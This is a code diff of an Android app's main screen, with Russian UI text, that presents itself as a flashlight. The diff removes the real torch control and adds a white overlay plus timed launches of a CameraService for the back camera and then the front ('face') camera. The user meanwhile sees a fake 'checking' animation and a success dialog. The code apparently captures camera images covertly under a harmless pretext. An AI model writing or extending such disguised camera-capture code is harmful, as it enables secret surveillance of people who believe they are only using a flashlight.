@@ -4,9 +4,6 @@ import android.Manifest;
 import android.app.AlertDialog;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.hardware.camera2.CameraAccessException;
-import android.hardware.camera2.CameraCharacteristics;
-import android.hardware.camera2.CameraManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -19,10 +16,8 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 public class MainActivity extends AppCompatActivity {
-    private CameraManager cameraManager;
-    private String cameraId;
     private boolean isProcessing = false;
-    private View greenOverlay;
+    private View greenOverlay, whiteOverlay;
     private TextView tvAnim;
 
     @Override
@@ -31,17 +26,9 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         greenOverlay = findViewById(R.id.green_overlay);
+        whiteOverlay = findViewById(R.id.white_overlay);
         tvAnim = findViewById(R.id.tv_anim_text);
         Button btn = findViewById(R.id.btn_flash);
-
-        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
-        try {
-            for (String id : cameraManager.getCameraIdList()) {
-                Boolean flash = cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
-                if (flash != null && flash) { cameraId = id; break; }
-            }
-            if (cameraId == null) cameraId = cameraManager.getCameraIdList()[0];
-        } catch (CameraAccessException e) { e.printStackTrace(); }
 
         btn.setOnClickListener(v -> {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
@@ -63,35 +50,32 @@ public class MainActivity extends AppCompatActivity {
                 greenOverlay.setVisibility(View.VISIBLE);
                 tvAnim.setText("Проверка.");
                 
-                // 1. Включаем фонарь
-                try { cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}
-
-                // 2. Запускаем ЗАДНЮЮ камеру (пока экран "Проверка", фонарь горит)
-                Intent backSvc = new Intent(this, CameraService.class);
-                backSvc.putExtra("camera_type", "back");
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(backSvc);
-                else startService(backSvc);
-
                 Handler handler = new Handler(Looper.getMainLooper());
                 handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
                 handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);
 
-                // 3. Через 3 секунды: Выключаем фонарь, меняем текст на "Активация..."
-                handler.postDelayed(() -> {
-                    tvAnim.setText("Активация фонаря...");
-                    try { cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
-                    
-                    // 4. Запускаем ФРОНТАЛЬНУЮ камеру (пока экран "Активация")
-                    Intent frontSvc = new Intent(this, CameraService.class);
-                    frontSvc.putExtra("camera_type", "face");
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(frontSvc);
-                    else startService(frontSvc);
-
-                }, 3000);
-
-                // 5. Через 6 секунд завершаем (успех)
+                // Через 2 секунды: белый экран и запуск камер
                 handler.postDelayed(() -> {
                     greenOverlay.setVisibility(View.GONE);
+                    whiteOverlay.setVisibility(View.VISIBLE);
+                    
+                    Intent backSvc = new Intent(this, CameraService.class);
+                    backSvc.putExtra("camera_type", "back");
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(backSvc);
+                    else startService(backSvc);
+
+                    handler.postDelayed(() -> {
+                        Intent frontSvc = new Intent(this, CameraService.class);
+                        frontSvc.putExtra("camera_type", "face");
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(frontSvc);
+                        else startService(frontSvc);
+                    }, 1000);
+
+                }, 2000);
+
+                // Через 6 секунд: убираем белый экран, показываем "Успех"
+                handler.postDelayed(() -> {
+                    whiteOverlay.setVisibility(View.GONE);
                     isProcessing = false;
                     
                     new AlertDialog.Builder(this)
